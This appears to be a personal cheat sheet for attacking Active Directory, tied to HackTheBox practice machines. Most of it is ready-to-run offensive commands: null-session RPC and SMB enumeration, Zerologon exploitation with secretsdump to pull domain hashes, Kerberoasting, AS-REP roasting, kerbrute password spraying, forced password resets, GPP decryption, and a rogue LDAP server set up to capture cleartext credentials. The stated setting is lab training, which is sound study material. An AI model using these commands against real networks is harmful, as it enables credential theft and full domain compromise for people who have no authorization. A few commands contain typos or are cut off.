# HackTheBox AD machines
Do the following machines and watch ippsec's videos on them
- monteverde
- cascade
- traversex
- fuse
- intelligence
- remote
- resolute
- sizzle
- multimaster
- sauna
- forest
- object
- active

# Enumeration

### RPC
RPC Null Authentication: `rpcclient -U '' <IP>`

RPC Null Authentication with no password: `rpcclient -U '' <IP>`

If you are able to log in, run `enumdomusers` to list out users

If you get a list of users, you can check their descriptions with the following command:

`querydispinfo`

### SMTP
`nmap -v --script="smtp*" -p25,110,143,465,587,993,995 <IP>`

### SMB
`crackmapexec smb <IP> --shares`

`crackmapexec smb <IP> -u '' -p '' --shares`

`crackmapexec smb <IP> -u '' --shares`

`crackmapexec smb <IP> --pass-pol`

`crackmapexec smb --users`

`smbmap -H <IP>`

`smbclient -L //<IP>`

`smbclient --no-pass //<IP>/<share name> -U''`

### LDAP
git clone windapsearch by ropnop if you don’t already have it

`python [windapsearch.py](http://windapsearch.py) -U --full --dc-ip <IP>`

- pipe this out to a tmp file and use the following command to sort. once sorted, look for interesting strings such as `password` or `pwd`
    - `cat tmp | awk '{print $1}' | sort | uniq -c | sort -nr | grep ':'`
    - YOU SHOULD THEN `grep -i` FOR:
        - `pass`
        - `pwd`
        - `password`
        - `etc`

### Zero Logon

*Do not run this is a production environment as this may break the domain controller*

git clone the github repo for `CVE-2020-1472` by dirkjanm and then download the `zero-logon tester` script for the same CVE by SecuraBV

run the tester script with the following syntax:

- `python3 [zerologontester.py](http://zerologontester.py) <DC NAME> <IP>`

if the script confirms the vulnerability, we can use secretsdump to dump the NTDS.DIT file:

- `impacket-secretsdump <domain name>/<DC NAME>\$@<DC IP> -just-dc`
- the `$` presents an empty value/string

### If you have a Valid User(s) and or Password(s):

- `python3 [bloodhound.py](http://bloodhound.py) -ns <DC IP> -d <domain> -dc <DC hostname> -u <username> -p <password> -c All`
- `rpcclient -U '<username>' <IP>` then run `enumdomusers` with this you can try `GetUserSPNs` or `GetNPUsers`
- *NO PASS REQ*`./kerbrute userenum -dc <DC IP> -d <domain> users.txt`
    - if this command does not run (fails) try sync your attack machine time with the time of the domain controller because kerberos authentication requires that the times be synced:
        - `nptdate <DC IP>`
- `./kerbrute passwordspray --dc <DC IP> -d <domain> users.txt <PASSWORD TO SPRAY>`
    - if this command does not run (fails) try sync your attack machine time with the time of the domain controller because kerberos authentication requires that the times be synced:
        - `ntpdate <DC`
- `impacket-GetUserSPNs <domain name>/<username>:<password> -outputfile krbroast`
- *NO PASS REQ*`impacket-GetNPUsers -dc-ip <DC IP> -no-pass -usersfile users.txt <domain name>/` OR `impacket-GetNPUsers -dc-ip <DC IP> -no-pass <domain name>/<username>`
- `crackmapexec smb <DC IP or CIDR range> smb/winrm - u <username file> -p <password file> --no-bruteforce --continue-on-success`
- `crackmapexec smb <IP> -u <username> -p <password> --shares -M spider_plus`
- `crackmapexec smb <IP> -u <username> -p <password> -M spider_plus`
    - to list out the contents of the spider plus module, you have to use `jq` to parse the data. to list everything in all the found shares run `cat /tmp/cme_spider_plus/<IP>.json | jq '. | map_values(keys)'`
    

## Misc

### Change User Pass with `rpcclient`

If your current user has the `ForceChangePass` flag on another user which you can find in bloodhound, you can use rpcclient to change the password then maybe read shares with smbclient/cme or do more enumeration with the new user and password
be sure to try a password that might fit in a password policy

- `rpcclient -U <username>`
- `setuserinfo2 <username to change password> 23 '<new password>'`

### Change User Pass with `smbpasswd`

`smbpasswd -U <username> -r <Domain name or IP>`

### Mount SMB Share

`sudo mount -t cifs -o 'username=<username>,password=<password>' //<IP>/<Share you want to mount> /mnt/<folder to mount to>`

### Cracking GPP Password/Hash

this is some sort of cpassword or something

`gpp-decrypt <hash>`

## LDAP

### Hosting a Rogue LDAP Server

Install the following packages`apt-get install slapd ldap-utils`

Enable package on boot with`systemctl enable slapd`

Configure server to make it insecure with `dpkg`

- `dpkg-reconfigure -p low slapd`
- When prompted, select `No`
- provide the target domain eg `hiddenleaf.local`
- use the same domain as the organization name
- provide an admin password eg `admin123`
- select `MDB` as the database to use
- select `yes` for the database to be removed when slapd in purged
- `yes` to move old database

To allow credentials to be shown in clear text we have to downgrade the authentication methods. Create an ldif file called `olcSaslSecProps.ldif`:

```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

Use the file to patch the LDAP server:

- `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif`
- `systemctl restart slapd` or `service slapd restart`

Now listen using tcpdump:

`sudo tcpdump -SX -i eth0 tcp port 389`

It might take a few tries before you receive anything if you running over a vpn